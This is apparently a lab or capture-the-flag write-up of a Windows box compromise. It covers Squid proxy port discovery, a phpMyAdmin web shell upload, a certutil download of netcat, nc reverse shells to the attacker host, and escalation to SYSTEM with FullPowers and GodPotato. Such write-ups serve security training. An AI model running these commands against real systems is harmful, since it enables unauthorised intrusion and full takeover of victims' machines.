#### Info Enumeration
```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
```

Port 3128, squid proxy is running

https://hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html

try to interact with squid

`└─$ python3 spose.py --proxy http://192.168.112.189:3128 --target 192.168.112.189`
```
Scanning default common ports
Using proxy address http://192.168.112.189:3128
192.168.112.189:3306 seems OPEN
192.168.112.189:8080 seems OPEN
```
Got port 8080 is open, via proxy.set proxy as this IP and we can access port 8080 using Burp Suite

on the page some tools are available, phpmyadmin, phpsystemifo, phpinfo...
```
http://192.168.112.189:8080/?phpinfo=-1
allow_url_fopen	On	On
allow_url_include	Off	Off
```

#### Foot hold
for phpMyAdmin, 5.0.2
we can upload php file into this server: https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f

first use sql query to creata a uploader page.
`http://192.168.112.189:8080/uploader.php`

then use this upload cmd.php
`http://192.168.112.189:8080/cmd.php?cmd=whoami`
```
nt authority\local service
```
Then transfer nc to target host
`certutil.exe -urlcache -f http://192.168.45.176/nc64.exe  nc.exe`

`http://192.168.112.189:8080/cmd.php?cmd=certutil.exe%20-urlcache%20-f%20http://192.168.45.176/nc64.exe%20%20nc.exe`

`http://192.168.112.189:8080/cmd.php?cmd=nc.exe%20192.168.45.176%208821%20-e%20cmd`

`─$ nc -nvlp 8821`
```
listening on [any] 8821 ...
connect to [192.168.45.176] from (UNKNOWN) [192.168.112.189] 49939
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\wamp\www>whoami
whoami
nt authority\local service
```

#### Priv Escalate
After some research, this is a restricted account.

https://itm4n.github.io/localservice-privileges/

https://github.com/itm4n/FullPowers

use fullpowers toll to restore the priv

`PS C:\Windows\system32> whoami /priv`
```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```
We can see  SeImpersonatePrivilege

`C:\Users\Public>.\GodPotato.exe -cmd "cmd /c nc.exe 192.168.45.176 8822 -e cmd"`

`└─$ nc -nvlp 8822`
```
listening on [any] 8822 ...
connect to [192.168.45.176] from (UNKNOWN) [192.168.112.189] 49962
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Public>whoami
whoami
nt authority\system
```

#### lesson learned
- squid proxy
- phpmyadmin uploader by admin user
- nt authority\local service, restricted user restore priv
